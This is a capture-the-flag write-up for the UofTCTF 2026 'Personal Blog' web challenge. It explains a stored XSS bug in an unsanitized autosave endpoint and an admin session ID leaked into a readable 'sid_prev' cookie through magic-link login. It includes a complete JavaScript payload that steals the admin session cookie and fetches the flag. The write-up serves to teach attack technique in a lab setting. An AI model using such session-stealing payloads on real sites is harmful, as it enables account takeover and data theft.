# Web - Personal Blog

## Challenge Overview

This is a web challenge featuring a blogging platform with an XSS vulnerability that allows stealing the admin's session to retrieve the flag from `/flag`.

## Key Vulnerabilities

### 1. Stored XSS via Autosave (No Sanitization)

The `/api/autosave` endpoint stores content in `draftContent` **without sanitization**:

```javascript
// server.js - autosave does NOT sanitize
post.draftContent = rawContent;  // RAW content stored!
```

While `/api/save` sanitizes with DOMPurify, autosave doesn't. The editor page (`/edit/:id`) renders this unsanitized draft directly.

### 2. Session Cookie Leakage via Magic Links

When logging in via a magic link, the server saves the **previous session** in `sid_prev` cookie:

```javascript
// server.js - Magic link login
const existingSid = req.cookies.sid;
if (existingSid) {
  res.cookie('sid_prev', existingSid, cookieOptions());  // Admin's SID saved here!
}
```

Cookies are set with `httpOnly: false`, making them accessible to JavaScript.

## Attack Flow

1. **Register & Login** as attacker
2. **Create a post** and inject malicious JavaScript via `/api/autosave`
3. **Generate a magic link** token for attacker's account
4. **Report URL** to admin bot: `/magic/{token}?redirect=/edit/{postId}`

When the admin bot visits:
1. Bot logs in as admin → gets admin's `sid` cookie
2. Bot visits the magic link → logs in as attacker, admin's `sid` saved to `sid_prev`  
3. Redirects to `/edit/{postId}` → renders unsanitized XSS payload
4. XSS executes with access to both cookies

## Exploit Payload

```javascript
<script>
(async () => {
    const cookies = document.cookie;
    const adminSid = cookies.match(/sid_prev=([a-f0-9]+)/)[1];
    const mySid = cookies.match(/sid=([a-f0-9]+)/)[1];

    // Swap to admin session
    document.cookie = "sid=" + adminSid + "; path=/";
    
    // Fetch flag as admin
    const flag = await (await fetch('/flag')).text();

    // Swap back to attacker
    document.cookie = "sid=" + mySid + "; path=/";
    
    // Save flag to attacker's post
    await fetch('/api/save', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({postId: POST_ID, content: flag})
    });
})();
</script>
```

## Proof of Work

The challenge includes a PoW based on modular square roots over the Mersenne prime M_1279 = 2^1279 - 1.

Given challenge value `x`, find `y` such that after `difficulty` iterations of:
```
v ← (v ⊕ 1)^2 mod M_1279
```
we get `x`.

Since M_1279 ≡ 3 (mod 4), square roots are computed as:
```
√a = a^((M_1279+1)/4) = a^(2^1277) mod M_1279
```

Work backwards from `x` by taking square roots and XORing with 1.

## Solution

After the bot visits and executes the payload, check your post to retrieve the flag.

## Flag

`uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}`

## Attachments

- [exploit.py](https://raw.githubusercontent.com/rehackxyz/REUN10N/main/CTF-writeups/2026/uoftctf-2026/assets/personalblog-exploit.py)


Solved by: jerit3787